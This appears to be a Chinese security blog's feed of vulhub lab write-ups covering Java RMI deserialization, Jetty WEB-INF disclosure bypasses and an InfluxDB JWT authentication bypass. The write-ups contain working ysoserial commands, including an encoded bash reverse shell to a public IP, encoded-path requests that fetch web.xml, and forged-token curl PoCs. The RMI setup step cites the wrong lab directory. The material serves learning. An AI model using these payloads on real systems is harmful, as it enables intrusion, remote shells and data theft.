    <link href="http://yoursite.com/2022/12/09/Java%20RMI%20Registry%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(=jdk8u111)/"/>
    <id>http://yoursite.com/2022/12/09/Java RMI Registry 反序列化漏洞(=jdk8u111)/</id>
    <published>2022-12-09T13:00:01.000Z</published>
    <updated>2023-10-29T11:53:51.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><blockquote><p><strong>远程方法调用（Remote Method Invocation，简称RMI）</strong>是一种用于在分布式系统中进行远程通信和方法调用的机制。它允许程序员在不同的计算机或进程之间通过网络进行函数或方法的调用，使得远程对象就像本地对象一样可以被调用。</p><p>RMI 的基本工作原理如下：</p><ol><li>定义接口：首先需要定义一个接口，其中包含要在远程计算机上调用的方法。接口的实现类将会被注册到 RMI 服务端。</li><li>编写客户端和服务器端代码：在客户端代码中，通过 RMI 远程引用获取远程对象的实例。然后，就可以通过远程对象来调用远程方法。在服务器端代码中，创建一个实现了接口的类，并注册该实例到 RMI 服务端。</li><li>对象序列化与传输：在 RMI 中，远程方法的参数和返回值可以是可序列化的对象。在方法调用时，参数对象会通过网络传输到远程服务器，服务器执行相应的方法，并将结果返回给客户端。</li><li>RMI 注册中心：RMI 注册中心（Registry）是一个用于维护远程对象引用的命名服务，在客户端和服务器端之间进行对象的绑定与查找。</li><li>安全性：RMI 支持对远程调用进行安全验证和授权，可以通过配置安全策略文件和使用数字证书来确保通信的安全性。</li></ol><p>使用 RMI 可以方便地实现分布式系统中的组件通信和方法调用，使得远程计算机上的对象就像本地对象一样被访问。但需要注意的是，RMI 依赖于网络通信，因此在设计和实现时需要考虑网络延迟、故障处理和安全性等因素。</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能（虽然大多数情况不允许远程bind），在bind过程中，伪造Registry接收到的序列化数据（实现了Remote接口或动态代理了实现了Remote接口的对象），使Registry在对数据进行反序列化时触发相应的利用链（环境用的是commons-collections:3.2.1）。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令编译及启动RMI Registry和服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/influxdb/CVE-2019-20933/</span><br><span class="line">docker-compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>其中，<code>your-ip</code>是服务器IP，客户端会根据这个IP来连接服务器。</p><p>环境启动后，RMI Registry监听在1099端口。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li><strong>commons-collections:3.2.1</strong> 是 <strong>Apache Commons Collections</strong> 的一个特定发布版本。Apache Commons Collections 是一个开源的Java类库，提供了许多实用的集合类、迭代器、比较器、转换器等工具，它们可以帮助简化和改进 Java 中集合操作的编程。这个库包含了丰富的功能，如排序、过滤、遍历、转换等，并且还提供了一些特殊的集合类，如支持多值映射的 MultiMap、可变大小的 BitSet 等。</li><li><strong>RMIRegistryExploit</strong> 是一种利用 Java 远程方法调用（Remote Method Invocation，RMI）注册表的漏洞进行攻击的技术或工具。RMI 注册表是一个 Java RMI 系统中的核心组件，它充当着远程对象的注册中心，使客户端能够在网络上查找远程对象并进行远程方法调用。</li></ul><p>dnslog生成一个DNS   <a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p><p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击，攻击机执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182956085.png" alt="image-20230910182956085"></p><p>Registry会返回报错，但命令会正常执行。可以看到dnslog成功接收请求</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910182722694.png" alt="image-20230910182722694"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-2874a69f61-1.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183359239.png" alt="image-20230910183359239"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910183436780.png" alt="image-20230910183436780"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java-RMI-Registry-反序列化漏洞-lt-jdk8u111&quot;&gt;&lt;a href=&quot;#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111&quot; class=&quot;headerlink&quot; title=&quot;Java RMI Registry 反序
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Java反序列化" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</title>
    <link href="http://yoursite.com/2022/11/17/Jetty%20WEB-INF%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-34429/"/>
    <id>http://yoursite.com/2022/11/17/Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429/</id>
    <published>2022-11-17T13:00:01.000Z</published>
    <updated>2023-10-29T11:56:54.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429"><a href="#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429" class="headerlink" title="Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429"></a>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p>Jetty在9.4.40后修复了因为<code>%2e</code>导致的敏感信息泄露漏洞<a href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164" target="_blank" rel="noopener">CVE-2021-28164</a>，但这个修复是不完全的，通过下面三种方式可以进行绕过：</p><ul><li>unicode形式URL编码：<code>/%u002e/WEB-INF/web.xml</code></li><li><code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code></li><li><code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></li></ul><p>参考链接：</p><ul><li><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm</a></li><li><a href="https://xz.aliyun.com/t/10039" target="_blank" rel="noopener">https://xz.aliyun.com/t/10039</a></li></ul><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">9.4.37 ≤ Eclipse Jetty ≤ 9.4.42</span><br><span class="line">10.0.1 ≤ Eclipse Jetty ≤ 10.0.5</span><br><span class="line">11.0.1 ≤ Eclipse Jetty ≤ 11.0.5</span><br></pre></td></tr></table></figure><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Jetty 9.4.40：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8080</code>可以查看到一个example页面</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li><p>“%u002e” 是一个 Unicode 转义序列，表示 ASCII 字符集中的句点（”.”）。</p><p>Unicode 转义序列是一种将 Unicode 字符表示为 ASCII 字符的方法。它使用 “%u” 后跟四个十六进制数字来表示字符的 Unicode 编码值。</p><p>对于 “%u002e” 转义序列，其中 “002e” 是句点字符（”.”）的 Unicode 编码值。在 ASCII 字符集中，句点（”.”）的 Unicode 编码值为 002E。</p><p>注意，转义序列 “%u002e” 是一种字符表示形式，并不影响该字符的实际含义或用途。在常规的文本处理中，直接使用句点字符（”.”）即可，无需使用转义序列。</p></li><li><p>“%00” 是 URL 编码中表示空字节（null byte）的一种方式。</p><p>URL 编码用于在 URL 中表示特殊字符和非 ASCII 字符。它通过将字符转换为一系列百分号（%）后跟两个十六进制数字的形式来表示。</p><p>在 “%00” 中，”00” 是空字节的十六进制表示。空字节是以二进制值 00000000 表示的特殊字符，它在字符串中通常表示字符串的结束或作为字符串中的分隔符。</p><p>空字节在 URL 编码中通常被视为字符串的结束符号</p></li></ul><p>直接访问<code>/WEB-INF/web.xml</code>将会返回404页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 123.56.181.14:8080/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184941627.png" alt="image-20230910184941627"></p><p>1.使用<code>/%u002e</code>来绕过限制下载web.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/%u002e/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190205075.png" alt="image-20230910190205075"></p><p>2.<code>\0</code>组合<code>.</code>导致的绕过：<code>/.%00/WEB-INF/web.xml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/.%00/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190319051.png" alt="image-20230910190319051"></p><p>3.<code>\0</code>组合<code>..</code>导致的绕过：<code>/a/b/..%00/WEB-INF/web.xml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/a/b/..%00/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910190412366.png" alt="image-20230910190412366"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429&quot;&gt;&lt;a href=&quot;#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-34429&quot; class=&quot;headerlink&quot; title=&quot;Jetty WEB-INF 敏感信息
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="敏感信息泄露" scheme="http://yoursite.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164</title>
    <link href="http://yoursite.com/2022/11/16/Jetty%20WEB-INF%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-28164/"/>
    <id>http://yoursite.com/2022/11/16/Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164/</id>
    <published>2022-11-16T12:00:01.000Z</published>
    <updated>2023-10-29T11:53:39.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-28164"><a href="#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-28164" class="headerlink" title="Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164"></a>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-28164</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p><strong>Jetty 9.4.37</strong>引入对RFC3986的新实现，而URL编码的<code>.</code>字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过<code>%2e</code>来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。<strong>该漏洞在9.4.39中修复。</strong></p><p>参考链接：</p><ul><li><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5</a></li><li><a href="https://xz.aliyun.com/t/10039" target="_blank" rel="noopener">https://xz.aliyun.com/t/10039</a></li></ul><blockquote><p><strong>Eclipse Jetty</strong>，通常称为 Jetty，是一个开源的、基于 Java 的 Web 服务器和 Servlet 容器。它是在 Eclipse 基金会的支持下开发和维护的项目。</p><p><strong>Servlet 容器</strong>指的是 Java Web 服务器运行环境中的一个组件，用于管理和执行 Servlet 和 JSP 程序。Servlet 容器通常被称为 Servlet 引擎或者 Servlet 容器引擎。</p><p>常见的 Servlet 容器包括 Tomcat、Jetty、GlassFish、WebLogic 等。这些容器都实现了 Servlet 规范，并且提供了额外的功能和扩展性，使得开发人员可以更方便地构建和部署 Web 应用程序。</p></blockquote><blockquote><p><strong>Servlet（Serverlet）</strong>是 Java 编程语言用于服务器端开发的一种技术。它是由 Java Servlet API 提供支持的。Servlet 运行在 Web 服务器中，用于处理客户端（通常是 Web 浏览器）发送的请求并生成响应。</p><p>Servlet 技术基于 Java 平台，可以在各种 Web 服务器（如 Apache Tomcat、Jetty、IBM WebSphere 等）上运行。它通过使用 Java 编程语言和标准的 Java 库，为开发人员提供了一种可靠而强大的方式来构建 Web 应用程序。</p><p>Servlet 的主要目的是处理与 Web 相关的任务，如接受用户请求、读取请求参数、执行业务逻辑、生成动态内容等。它可以接收来自客户端的请求，然后根据请求的类型（例如 GET 或 POST）执行适当的操作，并生成相应的响应。</p></blockquote><blockquote><p><strong>WEB-INF</strong>是JAVA的WEB应用安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。它包括:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; /WEB-INF/web.xml    #WEB应用程序配置文件，描述了servlet和其它应用组件配置及命名规则。</span><br><span class="line">&gt; /WEB-INF/classes/    #含站点所有的class文件</span><br><span class="line">&gt; /WEB-INF/lib/       #存放WEB应用需要的各种JAR文件</span><br><span class="line">&gt; /WEB-INF/src/       #源码目录</span><br><span class="line">&gt; /WEB-INF/database.properties      #数据库配置文件</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Jetty 9.4.37：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8080</code>可以查看到一个example页面。</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184801667.png" alt="image-20230910184801667" style="zoom:67%;"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>/WEB-INF/web.xml</code>将会返回404页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 123.56.181.14:8080/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910184941627.png" alt="image-20230910184941627"></p><p>使用<code>%2e/</code>来绕过限制下载web.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://123.56.181.14:8080/%2e/WEB-INF/web.xml&apos;</span><br></pre></td></tr></table></figure><ul><li>%2e 是 URL 编码中的一种表示方式，用来表示 ASCII 字符 “.” 的编码值。在URL中，”.” 是一个特殊字符，它通常用于表示路径的分隔符或者文件名的扩展名。</li><li><code>-v</code> 选项用于启用详细模式（verbose mode），它会显示更多的请求和响应的信息，包括请求头、响应头以及其他有关网络连接的调试信息。</li></ul><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910185636689.png" alt="image-20230910185636689"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-28164&quot;&gt;&lt;a href=&quot;#Jetty-WEB-INF-敏感信息泄露漏洞-CVE-2021-28164&quot; class=&quot;headerlink&quot; title=&quot;Jetty WEB-INF 敏感信息
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="敏感信息泄露" scheme="http://yoursite.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）</title>
    <link href="http://yoursite.com/2022/11/10/InfluxDB%20JWT%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-20933%EF%BC%89/"/>
    <id>http://yoursite.com/2022/11/10/InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）/</id>
    <published>2022-11-10T13:00:01.000Z</published>
    <updated>2023-10-29T11:54:12.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="InfluxDB-JWT-认证绕过漏洞（CVE-2019-20933）"><a href="#InfluxDB-JWT-认证绕过漏洞（CVE-2019-20933）" class="headerlink" title="InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）"></a>InfluxDB JWT 认证绕过漏洞（CVE-2019-20933）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。</p><p><strong>在其1.7.6版本以前</strong>，默认设置jwt的认证密钥<code>shared-secret</code>为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</p><blockquote><p>InfluxDB是一种高性能、分布式的时序数据库，旨在处理大量的时间序列数据，并支持快速查询和高效存储。它支持SQL类似的查询语言，使用户可以轻松地进行实时分析和基于时间序列的数据可视化。</p><p>以下是 InfluxDB 的主要特点：</p><ol><li>高性能：InfluxDB 采用了专门为时间序列数据而设计的高效存储引擎，提供了出色的写入和查询性能，可以轻松处理海量的时序数据。</li><li>分布式架构：InfluxDB 支持水平扩展，可以在多个节点之间分布数据，以提高性能和可靠性。此外，它还提供了数据复制和故障转移功能，以确保数据的高可用性和可靠性。</li><li>SQL 类似的查询语言：InfluxDB 支持 InfluxQL 查询语言，通过简单的 SQL 类似的语法，可以轻松地查询和过滤大量的时序数据。它还提供了聚合和分组等强大的查询功能，能够灵活地处理不同的查询需求。</li><li>数据可视化：InfluxDB 提供了 Grafana 等多种数据可视化工具的插件支持，可以方便地进行基于时间序列的数据可视化和报表生成。</li><li>支持数据采集：InfluxDB 支持多种数据采集端，如 Telegraf、Fluentd 等，在实时场景中可以灵活地收集和处理各种数据来源，如系统指标、日志、传感器数据等。</li></ol><p>总体而言，InfluxDB 是一种功能强大、性能出色的时序数据库，广泛应用于物联网、分布式系统、应用监控等领域。它支持多种数据源，提供了强大的查询和可视化功能，通过水平扩展和高可用性的架构，保证了海量数据的高效处理和存储。</p></blockquote><p>参考链接：</p><ul><li><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">https://www.komodosec.com/post/when-all-else-fails-find-a-0-day</a></li><li><a href="https://github.com/influxdata/influxdb/issues/12927" target="_blank" rel="noopener">influxdata/influxdb#12927</a></li><li><a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" target="_blank" rel="noopener">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></li><li><a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings" target="_blank" rel="noopener">https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings</a></li><li><a href="http://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</a></li></ul><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动InfluxDB 1.6.6：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/influxdb/CVE-2019-20933/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910154220469.png" alt="image-20230910154220469"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910162422082.png" alt="image-20230910162422082" style="zoom:80%;"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>信息搜集</strong></p><p>先确定版本号是否存在漏洞，版本 &lt; 1.7.6，是存在认证绕过漏洞的版本：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910162633445.png" alt="image-20230910162633445"></p><p>判断Influxdb服务绑定的端口号以及是否在公网进行监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu</span><br><span class="line">netstat -pantu | grep influx</span><br></pre></td></tr></table></figure><p>默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。</p><p><strong>漏洞利用</strong></p><p>输入如下命令进行用户名发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G &apos;http://123.56.181.14:8086/debug/requests&apos;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910164737834.png" alt="image-20230910164737834"></p><p>可以看到并没有返回数据库相关的用户名。</p><p>InfluxDB具有Web管理界面，其存在一个默认的admin用户名，利用该用户名生成JSON Web Token后即可绕过认证，获得完整的用户权限，可以任意执行增删改等数据库操作。</p><p>我们借助<a href="https://jwt.io/来生成jwt" target="_blank" rel="noopener">https://jwt.io/来生成jwt</a> token：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，需要设置为一个未来的时间戳。</p><p>最终生成的token：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910163906331.png" alt="image-20230910163906331"></p><p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910164310613.png" alt="image-20230910164310613"></p><p>POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=show users&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k&apos;</span><br></pre></td></tr></table></figure><p>利用效果如图，成功查询得到用户信息：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910165023287.png" alt="image-20230910165023287"></p><p>修改下PoC的利用方式，添加新的数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -G -X POST &apos;http://123.56.181.14:8086/query&apos; --data-urlencode &apos;q=create database hacked&apos; -H &apos;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk0MzM2NjYwfQ.ppl2b6_ddlOMionww8zs5x29EB2d2khQgNP1wWVQg6s&apos;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910165748830.png" alt="image-20230910165748830"></p><p>远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;InfluxDB-JWT-认证绕过漏洞（CVE-2019-20933）&quot;&gt;&lt;a href=&quot;#InfluxDB-JWT-认证绕过漏洞（CVE-2019-20933）&quot; class=&quot;headerlink&quot; title=&quot;InfluxDB JWT 认证绕过漏洞（CV
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="JWT认证绕过" scheme="http://yoursite.com/tags/JWT%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
    <link href="http://yoursite.com/2022/10/18/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
    <id>http://yoursite.com/2022/10/18/Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）/</id>
    <published>2022-10-18T13:00:12.000Z</published>
    <updated>2023-10-29T11:56:09.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><p>Tomcat版本：8.5.19</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/tomcat/CVE-2017-12615/</span><br><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>运行完成后访问<code>http://your-ip:8080</code>即可看到Tomcat的Example页面。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考：</p><ul><li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html" target="_blank" 